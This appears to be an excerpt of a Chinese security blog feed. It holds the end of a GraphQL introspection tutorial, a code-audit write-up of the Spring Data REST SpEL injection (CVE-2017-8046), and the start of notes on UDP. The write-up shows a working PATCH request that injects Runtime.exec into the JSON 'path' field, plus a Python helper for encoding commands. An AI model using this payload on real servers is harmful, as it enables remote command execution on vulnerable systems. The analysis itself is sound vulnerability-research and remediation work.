class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateOrganizationAllowPrivateRepositoryForkingSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectCardInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectCardPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectColumnInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectColumnPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectNextInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectNextItemFieldInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectNextItemFieldPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectNextPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestBranchInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestBranchPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestReviewCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestReviewCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestReviewInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestReviewPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateRefInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateRefPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateRepositoryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateRepositoryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateSponsorshipPreferencesInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateSponsorshipPreferencesPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateSubscriptionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateSubscriptionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateTeamDiscussionCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateTeamDiscussionCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateTeamDiscussionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateTeamDiscussionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateTopicsInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateTopicsPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;User&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserBlockDuration&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserBlockedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserContentEdit&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserContentEditConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserContentEditEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserEmailMetadata&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserStatus&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserStatusConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserStatusEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserStatusOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserStatusOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifiableDomain&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifiableDomainConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifiableDomainEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifiableDomainOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifiableDomainOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifiableDomainOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifyVerifiableDomainInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifyVerifiableDomainPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ViewerHovercardContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Votable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Workflow&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;WorkflowRun&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;X509Certificate&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__Directive&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__DirectiveLocation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__EnumValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__Field&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__InputValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__Schema&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__Type&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__TypeKind&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>Query, Character, Human, Episode, Droid</strong> - 这些是我们在类型系统中定义的类型。</li>
<li><strong>String, Boolean</strong> - 这些是内建的标量，由类型系统提供。</li>
<li><strong>__Schema, __Type, __TypeKind, __Field, __InputValue, __EnumValue, __Directive</strong> - 这些有着两个下划线的类型是内省系统的一部分。</li>
</ul>
<p>当我们设计类型系统的时候，我们确定了一个所有查询开始的地方</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">query &#123; </span><br><span class="line">  __schema &#123; </span><br><span class="line">    queryType&#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到查询结果为Query，这就表示所有查询开始的地方为Query</p>
<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315180125269.png" class title="image-20220315180125269">



<h3 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h3><p>有时候也需要检验一个特定的类型是对象还是接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query &#123; </span><br><span class="line">  __type(name:&quot;User&quot;) &#123; </span><br><span class="line">      name</span><br><span class="line">      kind</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务器返回OBJECT，这里表明User类型为对象</p>
<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315180624257.png" class title="image-20220315180624257">

<p>Actor类型为接口</p>
<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315181625124.png" class title="image-20220315181625124">



<h3 id="查询对象字段"><a href="#查询对象字段" class="headerlink" title="查询对象字段"></a>查询对象字段</h3><p>对于对象类型来说，我们需要知道其所包含的字段，方便后续进行查询，通过fields字段进行查询</p>
<p>查询语句:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query &#123; </span><br><span class="line">  __type(name:&quot;类型&quot;) &#123; </span><br><span class="line">    name</span><br><span class="line">    fields&#123;</span><br><span class="line">      name</span><br><span class="line">      type&#123;</span><br><span class="line">        name</span><br><span class="line">        kind</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>查询User类型包含字段，如图:</p>
<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315182105036.png" class title="image-20220315182105036">



<p>后续我们也可以通过ofType字段进一步查询定义的字段说明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query &#123; </span><br><span class="line">  __type(name:&quot;类型&quot;) &#123; </span><br><span class="line">    name</span><br><span class="line">    fields&#123;</span><br><span class="line">      name</span><br><span class="line">      type&#123;</span><br><span class="line">        name</span><br><span class="line">        kind</span><br><span class="line">        ofType&#123;</span><br><span class="line">        name </span><br><span class="line">        kind</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315182934064.png" class title="image-20220315182934064">

<h3 id="请求文档"><a href="#请求文档" class="headerlink" title="请求文档"></a>请求文档</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query &#123; </span><br><span class="line">  __type(name:&quot;类型&quot;) &#123; </span><br><span class="line">    name</span><br><span class="line">    kind</span><br><span class="line">    description</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315183231073.png" class title="image-20220315183231073">
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>-GraphQl -CTF练习</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计之Spring-Data-Rest-RCE</title>
    <url>/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/</url>
    <content><![CDATA[<h1 id="代码审计之Spring-Data-Rest-RCE"><a href="#代码审计之Spring-Data-Rest-RCE" class="headerlink" title="代码审计之Spring-Data-Rest-RCE"></a>代码审计之Spring-Data-Rest-RCE</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Spring Data Rest是Spring Data框架的其中一个组件，目的是消除curd的模板代码，减少程序员刻板的重复劳动。Spring Data Rest可构建Rest Web，Spring Data Rest对PATCH方法处理不当，导致攻击者能够利用JSON数据造成RCE。本质还是因为Spring的SPEL解析导致的RCE。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>Demo地址</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/spring-guides/gs-accessing-data-rest</span><br></pre></td></tr></table></figure>

<p>修改pom.xml配置中版本为漏洞版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;parent&gt;</span><br><span class="line">		&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">		&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">		&lt;version&gt;1.5.6.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class="line">	&lt;/parent&gt;</span><br></pre></td></tr></table></figure>

<p>浏览器访问localhost:8080&#x2F;people</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220421162545003.png" class title="image-20220421162545003">

<p>此时还没有记录，需要创建一个新的Person</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /people HTTP/1.1</span><br><span class="line">Host: 10.8.197.46:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 54</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;firstName&quot;: &quot;Frodo&quot;,</span><br><span class="line">  &quot;lastName&quot;: &quot;Baggins&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>添加记录成功。</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220421165435872.png" class title="image-20220421165435872">

<p>这里使用PATCH请求方式修改参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATCH /people/1 HTTP/1.1</span><br><span class="line">Host: 10.8.197.46:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json-patch+json</span><br><span class="line">Content-Length: 73</span><br><span class="line"></span><br><span class="line">[&#123; &quot;op&quot;:       &quot;replace&quot;, &quot;path&quot;:   &quot;/lastName&quot;, &quot;value&quot;:   &quot;Knownsec&quot; &#125;]</span><br></pre></td></tr></table></figure>

<p>此时lastName已经被修改</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220422112819139.png" class title="image-20220422112819139">

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据官方通报，此漏洞由PATCH请求导致的。</p>
<p>直接从org.springframework.data.rest.webmvc.config.JsonPatchHandler:apply()进行分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public &lt;T&gt; T apply(IncomingRequest request, T target) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">		Assert.notNull(request, &quot;Request must not be null!&quot;);</span><br><span class="line">		Assert.isTrue(request.isPatchRequest(), &quot;Cannot handle non-PATCH request!&quot;);</span><br><span class="line">		Assert.notNull(target, &quot;Target must not be null!&quot;);</span><br><span class="line"></span><br><span class="line">		if (request.isJsonPatchRequest()) &#123;</span><br><span class="line">			return applyPatch(request.getBody(), target);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			return applyMergePatch(request.getBody(), target);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到代码中通过isJsonPatchRequest()判断请求</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220421170848722.png" class title="image-20220421170848722">

<p>跟进该方法，首先判断请求方式为PATCH,接着判断Content-Type是否与application&#x2F;json-patch+json兼容</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220421170918377.png" class title="image-20220421170918377">

<p>在apply()方法判断逻辑中，当判断返回为True时，进入applyPatch()方法，跟进applyPatch()方法</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220421171255323.png" class title="image-20220421171255323">

<p>继续跟进getPatchOperations()方法，首先初始化了JsonPatchPatchCoverter类并调用了convert()方法</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220421171352805.png" class title="image-20220421171352805">

<p>跟进convert()方法，返回结果为atch()对象</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220421171614605.png" class title="image-20220421171614605">

<p>并且初始化中的op为一个list<PatchOperation>对象，该类定义了三个属性op、path、value</PatchOperation></p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220421172057159.png" class title="image-20220421172057159">

<p>而其中还有一个spelExpression属性，该属性根据path转化而来，继续跟进pathToExpression()</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220421172213465.png" class title="image-20220421172213465">

<p>跟进pathToSpEL()，这里将path由斜杠分割成字符数组</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220421172311247.png" class title="image-20220421172311247">

<p>跟进pathNodesToSpEL()方法，将由path分割的字符数组来传参返回spel,所以这里就是注入点，对path传值进行构造payload.</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220421172439585.png" class title="image-20220421172439585">

<p>上面对applyPatch()方法的getPatchOperations()是获取path参数并将其分割成字符数组，我们继续跟进apply()方法看如何对获取的参数进行处理</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220422104435034.png" class title="image-20220422104435034">

<p>这里的operation调用了perform()方法，此时的operation实际为ReplaceOperation</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220422104926661.png" class title="image-20220422104926661">

<p>跟进setValueOnTarget()方法</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220422105351049.png" class title="image-20220422105351049">

<p>值得注意的是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spelExpression.setValue(target, value);</span><br></pre></td></tr></table></figure>

<p>这一步就是执行了SpEL表达式，但这里需要将执行的命令转换为byte[]类型</p>
<p>python脚本如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command = &quot;xxxxxx&quot;#执行的命令</span><br><span class="line">payload = &quot;new byte[]&#123;&quot;</span><br><span class="line">for i in range(len(command)):</span><br><span class="line">        if i == len(command)-1:</span><br><span class="line">                payload+=str(ord(command[i]))</span><br><span class="line">        else:</span><br><span class="line">                payload+=str(ord(command[i]))+&#x27;,&#x27;</span><br><span class="line">payload+= &quot;&#125;&quot;</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATCH /people/1 HTTP/1.1</span><br><span class="line">Host: 10.8.197.46:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json-patch+json</span><br><span class="line">Content-Length: 149</span><br><span class="line"></span><br><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;99,97,108,99&#125;))/lastName&quot;, &quot;value&quot;: &quot;knownsec&quot; &#125;]</span><br></pre></td></tr></table></figure>

<p>这里执行加载计算器成功</p>
<img src="/2022/04/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Rest-RCE/image-20220422112929154.png" class title="image-20220422112929154">

<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>由于该漏洞由patch请求引起，建议在使用restful风格的接口时，不使用patch方式的请求。建议将spring boot的jar包升级到Spring Boot 2.0.0.M4以上(包括Spring Boot 2.0.0.M4也是安全版本)。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhuanlan.zhihu.com/p/166373950">技术研究 | Spring Data Rest RCE案例分析（CVE-2017-8046） - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>java</category>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>-代码审计 -Spring -命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>传输层知识要点</title>
    <url>/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/</url>
    <content><![CDATA[<h1 id="传输层知识要点"><a href="#传输层知识要点" class="headerlink" title="传输层知识要点"></a>传输层知识要点</h1><p>运输层为应用进程之间提供端到端的逻辑通信(从应用层来看)，从通信和信息处理角度看，运输层向上面的应用层提供通信服务。是面向通信部分的最高层和面向用户功能中的最底层。</p>
<p>网络层是为主机之间提供逻辑通信</p>
<p>软件端口：应用层各种协议与运输实体进行层间交互的地址</p>
<p>TCP端口：使用16位端口号进行标识，为了标识本计算机应用层中各进程。熟知端口数值0-1023(服务端)；登记端口数值1024-49151(服务端)；49152–65535动态端口(客户端)。</p>
<p>端口号只具有本地意义，标志本计算机应用进程与运输实体的交互层间接口。不同计算机应用进程可能采用不同端口号。</p>
<h2 id="用户数据报协议-UDP"><a href="#用户数据报协议-UDP" class="headerlink" title="用户数据报协议(UDP)"></a>用户数据报协议(UDP)</h2><p>UDP是无连接的(减少开销和发送之前的时延)，尽最大努力交付(主机不必维持复杂的连接状态)的传输协议。UDP面向报文(一次发送一个报文)，没有拥塞控制(实时电话)，至此一对一、一对多和多对一和多对多的交互通信。开销小，首部只有8字节。</p>
<p>发送方UDP对应用程序交下来的报文添加首部后就向下交付给IP网络层。只在IP数据服务上增加了很少功能，复用和分用以及差错检测功能。</p>
<img src="/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220729100709874.png" class title="image-20220729100709874">



<p>UDP报文格式：</p>
<img src="/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220729101111213.png" class title="image-20220729101111213">

<p>首部字段8个字节。</p>
<p>计算检验和过程：</p>
